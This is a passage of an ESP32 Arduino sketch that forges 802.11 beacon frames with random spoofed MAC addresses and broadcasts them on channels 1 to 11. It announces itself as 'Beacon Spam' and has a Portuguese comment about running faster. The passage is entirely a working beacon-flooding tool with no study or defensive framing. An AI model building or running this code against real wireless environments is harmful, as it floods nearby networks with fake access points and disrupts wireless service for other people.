const int ssidCount = sizeof(ssids) / sizeof(ssids[0]);
uint8_t beaconPacket[128];

void createBeacon(const char* ssid, uint8_t channel) {
  uint8_t fakeMac[6];
  for (int i = 0; i < 6; i++) fakeMac[i] = random(256);

  int ssidLen = strlen(ssid);
  int packetLen = 0;

  uint8_t beaconHeader[] = {
    0x80, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
    fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
    0x00, 0x00
  };

  memcpy(beaconPacket, beaconHeader, sizeof(beaconHeader));
  packetLen += sizeof(beaconHeader);

  uint8_t fixedParams[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04
  };

  memcpy(beaconPacket + packetLen, fixedParams, sizeof(fixedParams));
  packetLen += sizeof(fixedParams);

  beaconPacket[packetLen++] = 0x00;
  beaconPacket[packetLen++] = ssidLen;
  memcpy(beaconPacket + packetLen, ssid, ssidLen);
  packetLen += ssidLen;

  uint8_t channelInfo[] = { 0x03, 0x01, channel };
  memcpy(beaconPacket + packetLen, channelInfo, sizeof(channelInfo));
  packetLen += sizeof(channelInfo);

  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetLen, false);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_AP);
  esp_wifi_set_promiscuous(true);
  Serial.println("Beacon Spam Iniciado!");
}

void loop() {
  for (int ch = 1; ch <= 11; ch++) {
    for (int i = 0; i < ssidCount; i++) {
      createBeacon(ssids[i], ch);
      delay(1);  // mais rápido, pode testar com 0 também
    }
  }
}